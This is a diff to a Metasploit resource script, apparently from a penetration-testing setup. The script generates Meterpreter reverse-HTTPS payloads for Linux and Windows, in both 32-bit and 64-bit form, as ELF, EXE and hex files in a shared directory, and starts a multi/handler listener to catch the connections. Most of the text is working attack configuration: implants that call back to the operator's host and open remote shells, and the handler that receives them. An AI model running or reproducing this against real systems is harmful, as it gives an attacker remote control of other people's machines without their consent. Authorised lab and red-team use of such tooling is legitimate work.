@@ -5,46 +5,32 @@ setg PayloadUUIDTracking true
 setg HandlerSSLCert /certs/cert.pem
 setg StagerVerifySSLCert true
 setg IgnoreUnknownPayloads true
+setg LURI /multi
 
 # TODO clever user-agents so we know what's trying to connect to us
 
 use payload/linux/x64/meterpreter_reverse_https
 set PayloadUUIDName ParanoidStagedElf64
-#set LURI /multi
-generate -t elf -f /tmp/payloads/reverse.http.linux_amd64
+generate -t elf -f /pentest/share/reverse.http.linux_amd64
 
-#use payload/linux/x86/meterpreter_reverse_https
-#set PayloadUUIDName ParanoidStagedElf32
-#set LURI /multi
-#generate -t elf -f /tmp/payloads/reverse.http.linux_i386
+use payload/linux/x86/meterpreter_reverse_https
+set PayloadUUIDName ParanoidStagedElf32
+generate -t elf -f /pentest/share/reverse.http.linux_i386
 
 # these have to be staged: https://github.com/rapid7/metasploit-framework/issues/6364
 use payload/windows/x64/meterpreter/reverse_winhttps
 set PayloadUUIDName ParanoidStagedExe64
-#set LURI /win64
-generate -t exe -f /tmp/payloads/reverse.http.amd64.exe
+generate -t exe -f /pentest/share/reverse.http.amd64.exe
+generate -t hex -f /pentest/share/reverse.http.amd64.hex
 
 use payload/windows/meterpreter/reverse_winhttps
 set PayloadUUIDName ParanoidStagedExe32
-#set LURI /win32
-generate -t exe -f /tmp/payloads/reverse.http.i386.exe
-
-msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.56.1 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=/certs/cert.pem StagerVerifySSLCert=true IgnoreUnknownPayloads=true -f exe -o /tmp/payloads/reverse.exe
+generate -t exe -f /pentest/share/reverse.http.i386.exe
+generate -t hex -f /pentest/share/reverse.http.i386.hex
 
 use exploit/multi/handler
 set PAYLOAD multi/meterpreter/reverse_https
-# set LHOST 0.0.0.0
-# set LPORT 443
-# set PayloadUUIDTracking true
-# set HandlerSSLCert /certs/cert.pem
-# set StagerVerifySSLCert true
-# set IgnoreUnknownPayloads true
-# set ExitOnSession false
-# set LURI /multi
-# exploit -j
-
-#set PAYLOAD windows/x64/meterpreter/reverse_winhttps
-set LHOST 192.168.56.1
+set ExitOnSession false
 exploit -j
 
 back
